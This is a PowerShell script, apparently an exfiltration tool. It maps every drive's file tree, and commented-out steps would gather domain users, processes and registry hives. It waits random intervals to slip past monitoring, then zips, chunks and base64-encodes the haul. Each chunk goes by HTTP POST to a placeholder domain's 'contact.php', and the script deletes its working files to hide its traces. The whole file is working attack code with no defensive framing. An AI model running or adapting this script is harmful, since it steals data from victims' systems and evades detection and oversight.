# Make a dir in user's documents
$ErrorActionPreference = 'SilentlyContinue'
mkdir $HOME\temp

Start-Sleep -Seconds (Get-Random -Minimum 5 -Maximum 30)

function tasks {
    # Tree the drives available
    $drive=(get-psdrive -psprovider filesystem).Name

    foreach ($letter in $drive)
    {
      $comb=$letter+":\"
      tree /a /f $comb | Out-File -Append $HOME\temp\tree.txt
    } 

    Start-Sleep -Seconds (Get-Random -Minimum 30 -Maximum 60)

    # Get domain users
    #$net = net users /domain
    #$t5 = $net.Replace(" ","`r`n").Split("`r`n|`r|`n",[System.StringSplitOptions]::RemoveEmptyEntries) | Out-File $HOME\temp\users.txt

    #Start-Sleep -Seconds (Get-Random -Minimum 30 -Maximum 60)

    # Get processes
    #ps | Out-File $HOME\temp\processes.txt

    #Start-Sleep -Seconds (Get-Random -Minimum 30 -Maximum 60)

    # Get registries
    #Get-ChildItem -Path Registry::HKEY_*_* -Recurse | Out-File $HOME\temp\regs.txt
}
tasks

Start-Sleep -Seconds (Get-Random -Minimum 30 -Maximum 60)

# Compress the \temp folder with all fiels inside
Compress-Archive -Path "$HOME\temp" -DestinationPath "$HOME\temp\pics.zip" -Force
###
#$str=[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("$HOME\temp\pics.zip"))
#$splstr = $str -Split '(.{1000000})' | ? {$_} | Out-String
#$splstr | Out-File "$HOME\temp\test.b64"
#Exfiltrate
#Get-Content -Path $HOME\temp\test.b64 | ForEach-Object{Invoke-WebRequest -Uri http://<domain>/contact.php -Method POST -Body @{file=$_} -UseBasicParsing; Start-Sleep -Seconds (Get-Random -Minimum 1 -Maximum 5)}
###

# Split the main zip into small 50MB chunks
function split {
    $from = "$HOME\temp\pics.zip"
    $saveFolder = "$HOME\temp\"
    $ext = "zip"
    $upperBound = 50MB


    $fromFile = [IO.File]::OpenRead($from)
    $buff = New-Object Byte[] $upperBound
    $count = $idx = 0
    try {
        do {
            $count = $fromFile.Read($buff, 0, $buff.Length)
            if ($count -gt 0) {
                $to = "{0}{1}.{2}" -f ($saveFolder, $idx, $ext)
                $toFile = [IO.File]::OpenWrite($to)
                try {
                    $tofile.Write($buff, 0, $count)
                } finally {
                    $tofile.Close()
                }
            }
            $idx ++
        } while ($count -gt 0)
    }
    finally {
        $fromFile.Close()
    }
}
split

Start-Sleep -Seconds (Get-Random -Minimum 30 -Maximum 60)

# Convert the chunks into .env files and remove the archives
function conv {
    $fNumbs = (Get-Item $HOME\temp\*.zip).Name -replace "[^0-9]" , "" | Sort-Object {[int]$_} | Where-Object {$_}

    foreach ($qw in $fNumbs)
    {
        $str=[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("$HOME\temp\$qw.zip"))
        $splStr = $str -Split '(.{1000000})' | ? {$_} | Out-String
        $splStr | Out-File "$HOME\temp\$qw.enc"

        Remove-Item $HOME\temp\$qw.zip -Force -Recurse
    }
}
conv

Start-Sleep -Seconds (Get-Random -Minimum 30 -Maximum 60)

#Exfiltrate
function exfiltr {
    $exf = (Get-Item $HOME\temp\*.enc).Name -replace "[^0-9]" , "" | Sort-Object {[int]$_} | Where-Object {$_}

    foreach ($wq in $exf)
    {
        Get-Content -Path $HOME\temp\$wq.enc | ForEach-Object{Invoke-WebRequest -Uri http://<domain>/contact.php -Method POST -Body @{file=$_} -UseBasicParsing; Start-Sleep -Seconds (Get-Random -Minimum 5 -Maximum 10)}
    }
}
exfiltr

# Delete the folder and files
Remove-Item $HOME\temp -Force -Recurse
